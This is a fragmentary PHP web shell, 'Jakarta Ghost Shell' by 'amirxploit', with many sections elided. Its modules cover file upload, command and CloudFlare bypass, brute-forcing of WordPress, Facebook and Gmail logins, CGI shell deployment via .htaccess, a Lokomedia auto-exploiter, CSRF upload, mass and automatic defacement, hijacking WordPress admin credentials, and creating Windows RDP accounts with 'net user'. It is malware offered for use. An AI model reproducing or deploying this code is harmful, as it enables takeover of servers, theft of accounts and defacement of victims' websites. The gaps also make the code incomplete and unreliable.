...
#   amirxploit                      #
#   Coded By amirxploit         	#
#   amirexsploit@gmail.com      	# 
#   4ever only email :)	     	#
#   Security? that just an illucions#                 # 	Jakarta ghost         		#                #####################################
...
<html>
<head>
	<link rel="SHORTCUT ICON" href="https://f.top4top.io/p_2726i2q0f0.jpg">
<title>xXx::.JAKARTA GHOST.::xXx/title>
<style type="text/css">
html {
	background: #000000;
	color: green;
...
<center><div id="contenttengah"><center>
		<img title="AMIRXOLOIT"src="https://f.top4top.io/p_2726i2q0f0.jpg" width="70%"></div> </center>


<span class="style4"> Shell Programmer: <br>AMIRXOLOIT</span><br><br>
<span class="style4">AMIRXOLOIT: <br>Aril Gans</span><br><br>
<span class="style4">Official Member: <br>Jakarta Ghost - Leadis Ghost - Jakarta Ghost ID</span><br><br>
<span class="style4">Greetz : <br> From Lammer To Mastah </span>
</div></div></div></td>
</div>
...
<font color = "red" face = "Iceland" size = "6">AMIRXOLOIT Bypass</font><br><br><br>
...
<font color="#FFF000"> Users Found : <font color = 'red'>root@AMIRXOLOIT:~$ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font></font><br>
<font color="lime"> Connecting To Our Master ^_^  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="#F00000"><font color="#FFF000">root@AMIRXOLOIT:~$</font> Connected ! </font><br>
...
<font color="red">root@AMIRXOLOIT:~$ </font><font color="#FFF000"><?php echo "@". $ServerName ?><br></font><font color="red">Ready To Fuck Server :p</font>
</tr>
</tbody></table>
<br>
...
<font color = "red" face = "Verdana">Visit Us! : https://JakartaGhost-Team.site </font>
<audio controls autoplay hidden>
				<source src="https://a.tumblr.com/tumblr_nc451eJAWg1tjcth4o1.mp3" type="audio/mpeg">
			</audio><br><br>
<font color = "red" face = "Verdana">@CopyRights Jakarta Ghost Team2015 </font> 			
<?php
exit;
}
...
<head>
	<link rel="SHORTCUT ICON" href="https://f.top4top.io/p_2726i2q0f0.jpg">
<title>xXx::. JAKARTAGHOST Shell .::xXxx</title>
<meta name='author' content='amirxploit'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(http://fonts.googleapis.com/css?family=Iceland);
...
echo "<center>";
echo "<br>";
echo "<img src = 'https://f.top4top.io/p_2726i2q0f0.jpg' width = '110' height = '110' id='spinner'></img>";
echo "&emsp;&emsp;&emsp;";
echo "<font size='20px' color='red' face = 'Rajdhani'>$ AMIRXOLOIT Shell $</font>";
echo "&emsp;";
echo "<img src = 'https://f.top4top.io/p_2726i2q0f0.jpg' width = '100' height = '100' id='spinner'></img>";
echo "<br><br>";
if($_POST['upload']) {
...
//Fungsi log dinonaktifkan oleh AMIRXOLOIT
/*
$ch = curl_init();
...
<center/><br/><b><font color=white>-=[ Command  Bypass Exploit  By AMIRXOLOIT ]=-</font></b><br>
<?php
print_r('
<pre>
...
<center><p align="center" dir="ltr"><b><font size="5" face="Tahoma">+--=[ Bypass CloudFlare By AMIRXOLOIT ]=--+
</font></b></p>
...
function randomt() {
    ...
    */
    ...
    <center><br><br>
    <font color="white" size='+3'><b>+--=[ Automatic Joomla Index Changer By AMIRXPLOIT ]=--+</b></font><br><br>
    </center>
    <center><b>
...
<form action="?dir=<?php echo $pwd; ?>&amp;do=jbrute" method="post">
    ...
    <meta name="description" content="amirxploit" />
<center>
</br></br>
<center><b><font color="lime">+--=[ HECKER BY AMIRXPLOIT ]=--+</font></b><br /><br />
...
<center>
<br><Br><b><font size='2' >+--=[ Wordpress Brute Force  By AMIRXOLOIT ]=--+</font><br>
...
?>
	...
	<br><br><center><b><font size=4>+--=[ Facebook BruteForce by AMIRXOLOIT ]=--+</font></b></center><br><br>
	<?php
ob_start();
@set_time_limit(0);
#################################################
...
echo "<p align='center' dir='ltr'><font face='Arial Black' size='2'>This Password Seems Working !Try It ^_^ by AMIRXOLOIT|| Username: <font color='green'>$user</font>&nbsp; Password : <font color='green'>$pass</font></font></p>";
}
}            
...
<br>
<br>
<center><p><b><font size='2' face='Trebuchet MS' color='#FFFFFF'>Published by : AMIRXOLOIT<br><font size='2' face='Trebuchet MS' color='#FFFFFF'>Coded by : AMIRXOLOIT</font></b></p></center>";
}
...
?>
	...
	<br><br><center><b><font size=4>+--=[ Gmail BruteForce by AMIRXOLOIT ]=--+</font></b></center><br>
	<center><span style="font-size:30px; font-family:Fredericka the Great; color:#1975FF">Gmail & Hotmail BruteForce AMIRXOLOIT</span><center><br>
	<?php
   set_time_limit(0); 
error_reporting(0); 
...
echo"</textarea><br>ID: <input type='text' name='id' value='1'><br>TITLE :<input type='text' name='title' value='Hacked By AMIRXOLOIT'><br>POST CONTENT: <input type='text' name='content' value='Hacked By AMIRXOLOIT'><br>POSTNAME: <input type='text' name='postname' value='HackeD By AMIRXOLOIT'><br>
...
if($_POST['edittitle']) {
	...
	$cgi_dir = mkdir('ia_cgi', 0755);
        chdir('ia_cgi');
	$file_cgi = "cgipy.AMIRXOLOIT";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .Index_AMIRXOLOIT \n AddHandler cgi-script .Index_AMIRXOLOIT \n AddHandler cgi-script .Index_AMIRXOLOIT";
	...
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgipy.AMIRXOLOIT' target='_blank'>Klik Here</a>";
}
...
elseif($_GET['do'] == 'cgi') {
	$cgi_dir = mkdir('ia_cgi', 0755);
        chdir('ia_cgi');
	$file_cgi = "cgi.AMIRXOLOIT";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .AMIRXOLOIT \n AddHandler cgi-script .AMIRXOLOIT \n AddHandler cgi-script .AMIRXOLOIT";
	$htcgi = fopen(".htaccess", "w");
	...
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgi.AMIRXOLOIT' target='_blank'>Klik Here</a>";
...
elseif($_GET['do'] == 'cgi2') {
	...
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgi2.AMIRXOLOIT' target='_blank'>Klik Here</a>";
} 
	...
	foreach($domain as $url) {
		foreach($up as $user => $pass) {
			...
			if(preg_match("/Logout|Administrator/", $login)) {
				...
				$data2 = array(
					"judul" => "AMIRXOLOIT Shell auto exploiter lokomedia",
					"fupload" => "@$file",
					"upload" => " &nbsp;&nbsp;&nbsp;&nbsp; Simpan &nbsp;&nbsp;&nbsp;&nbsp;",
					);
...
if($_POST['username'] and $_POST['password']){
        ...
        echo "<p align='center' dir='ltr'><font size='2'>Coded By : AMIRXOLOIT, &amp; Recoded by AMIRXOLOIT</font></p>";

} elseif($_GET['do'] == 'csrfup')
{	
echo '<html>
<center><h1 style="font-size:33px;">CSRF Exploiter By IndoXPloit<br>Recoded by AMIRXOLOIT</h1><br><br>
...
<INPUT class=inputzbut type=submit value=setting name=send>
	...
	elseif($_POST['mass'] == 'massdeface') {
		...
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By AMIRXOLOIT</textarea><br>
...
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='AMIRXOLOIT'><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value=' AMIRXOLOIT'><br>
		<u>Domains</u>: <br>
...
<?php
	...
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='AMIRXOLOIT' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='AMIRXOLOIT' placeholder='pass_baru'><br>
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by AMIRXOLOIT' placeholder='New Title'><br><br>
	...
	if($_POST['submit']) {
		...
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='AMIRXOLOIT'><br>
		<u>Domains</u>: <br>
...
echo "</center></table>";   
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by AMIRXOLOIT' required><br>
...
";
	...
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			...
			if($_POST['opsi'] == '1') {
				...
				$cek = exe("net user $user AMIRXOLOIT");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>AMIRXOLOIT</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
			...
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='AMIRXOLOIT' required>
			<input type='text' name='pass' placeholder='password' value='AMIRXOLOIT' required>
			<input type='submit' name='create' value='>>'>
			</form>
			-- Option --<br>
			<form method='post'>
 ...
 elseif($_GET['act'] == 'rename_dir') {
	...
	echo "<center>Copyright &copy; ".date("Y")." <br><font color='red'> Shell JAKARTA GHOST By AMIRXOLOIT";
	}
?> 
